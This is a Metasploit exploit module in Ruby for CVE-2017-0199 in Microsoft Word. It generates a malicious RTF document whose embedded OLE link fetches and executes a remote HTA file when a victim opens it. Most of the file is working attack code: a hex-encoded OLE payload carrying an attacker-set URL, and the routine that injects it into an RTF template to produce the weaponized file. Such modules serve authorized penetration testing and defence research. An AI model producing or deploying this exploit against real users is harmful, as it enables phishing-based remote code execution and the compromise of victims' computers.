##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/ole'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => "MS17-019 Microsoft Word RTF Object Confusion",
      'Description'    => %q{
        This module creates a malicious RTF file that when opened in
        vulnerable versions of Microsoft Word will lead to code execution.
        The flaw exists in how a olelink object can make a http(s) request,
        and execute response in hta format.

        This bug was originally seen being exploited in the wild starting
        in Oct 2016. This module was created by reversing a public
        malware sample.
      },
      'Author'         =>
        [
          'Haifei Li', # vulnerability analysis
          'ryHanson',
          'wdormann',
          'DidierStevens',
          'vysec',
          'Nixawk' # module developer
        ],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2017-0199'],
        ['URL', 'https://securingtomorrow.mcafee.com/mcafee-labs/critical-office-zero-day-attacks-detected-wild/'],
        ['URL', 'https://www.fireeye.com/blog/threat-research/2017/04/acknowledgement_ofa.html'],
        ['URL', 'https://www.helpnetsecurity.com/2017/04/10/ms-office-zero-day/'],
        ['URL', 'https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html'],
        ['URL', 'https://www.checkpoint.com/defense/advisories/public/2017/cpai-2017-0251.html'],
        ['URL', 'https://github.com/nccgroup/Cyber-Defence/blob/master/Technical%20Notes/Office%20zero-day%20(April%202017)/2017-04%20Office%20OLE2Link%20zero-day%20v0.4.pdf'],
        ['URL', 'https://blog.nviso.be/2017/04/12/analysis-of-a-cve-2017-0199-malicious-rtf-document/'],
        ['URL', 'https://www.hybrid-analysis.com/sample/ae48d23e39bf4619881b5c4dd2712b8fabd4f8bd6beb0ae167647995ba68100e?environmentId=100'],
        ['URL', 'https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/'],
        ['URL', 'https://www.microsoft.com/en-us/download/details.aspx?id=10725'],
        ['URL', 'https://msdn.microsoft.com/en-us/library/dd942294.aspx'],
        ['URL', 'https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-CFB/[MS-CFB].pdf']
      ],
      'Platform'       => 'win',
      'DefaultOptions'        =>
        {
          'EXITFUNC' => 'thread',
          'DisablePayloadHandler' => true
        },
      'Targets'        =>
        [
          [ 'Microsoft Office',   {  } ],
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => false,
      'DisclosureDate' => 'Apr 14 2017'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The path to a hta file.', 'http://example.com/test.rtf'])
      ], self.class)

    deregister_options('FILENAME')
  end

  def generate_hexuri
    @uri_hex_limit = 224

    uri = datastore['TARGETURI']
    uri_hex = ''
    uri.each_byte { |b| uri_hex << b.to_s(16) + "00" }
    pad_length = @uri_hex_limit - uri_hex.length
    pad_length.times { uri_hex << "0" }

    uri_hex
  end

  def exploit
    payload = ""
    payload << "01000002090000000100000000000000" # 00000000: ................
    payload << "0000000000000000a4000000e0c9ea79" # 00000010: ...............y
    payload << "f9bace118c8200aa004ba90b8c000000" # 00000020: .........K......
    payload << generate_hexuri
    payload << "00000000795881f43b1d7f48af2c825d" # 000000a0: ....yX..;..H.,.]
    payload << "c485276300000000a5ab0000ffffffff" # 000000b0: ..'c............
    payload << "0609020000000000c000000000000046" # 000000c0: ...............F
    payload << "00000000ffffffff0000000000000000" # 000000d0: ................
    payload << "906660a637b5d2010000000000000000" # 000000e0: .f`.7...........
    payload << "00000000000000000000000000000000" # 000000f0: ................
    payload << "100203000d0000000000000000000000" # 00000100: ................
    payload << "00000000000000000000000000000000" # 00000110: ................
    payload << "00000000000000000000000000000000" # 00000120: ................
    payload << "00000000000000000000000000000000" # 00000130: ................
    payload << "00000000000000000000000000000000" # 00000140: ................
    payload << "00000000000000000000000000000000" # 00000150: ................
    payload << "00000000000000000000000000000000" # 00000160: ................
    payload << "00000000000000000000000000000000" # 00000170: ................
    payload << "00000000000000000000000000000000" # 00000180: ................
    payload << "00000000000000000000000000000000" # 00000190: ................
    payload << "00000000000000000000000000000000" # 000001a0: ................
    payload << "00000000000000000000000000000000" # 000001b0: ................
    payload << "00000000000000000000000000000000" # 000001c0: ................
    payload << "00000000000000000000000000000000" # 000001d0: ................
    payload << "00000000000000000000000000000000" # 000001e0: ................
    payload << "00000000000000000000000000000000" # 000001f0: ................

    template_path = ::File.join(Msf::Config.data_directory, "exploits", "cve-2017-0199.rtf")
    template_rtf = ::File.open(template_path, 'rb')

    data = template_rtf.read(template_rtf.stat.size)
    data.gsub!('MINISTREAM_DATA', payload)
    template_rtf.close

    file_create(data)
  end
end
